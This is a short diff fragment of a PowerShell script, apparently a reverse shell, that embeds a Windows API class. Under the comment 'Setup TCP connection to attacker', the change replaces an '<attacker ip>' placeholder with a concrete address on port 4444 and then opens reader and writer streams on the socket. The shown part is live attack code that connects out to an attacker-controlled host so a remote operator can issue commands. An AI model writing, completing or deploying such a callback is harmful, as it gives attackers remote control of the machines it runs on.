@@ -13,7 +13,7 @@ public class WinAPI {
 }
 
 # Setup TCP connection to attacker
-$client = New-Object System.Net.Sockets.TcpClient("<attacker ip>", 4444)
+$client = New-Object System.Net.Sockets.TcpClient("192.168.1.134", 4444)
 $stream = $client.GetStream()
 $reader = New-Object System.IO.StreamReader($stream)
 $writer = New-Object System.IO.StreamWriter($stream)
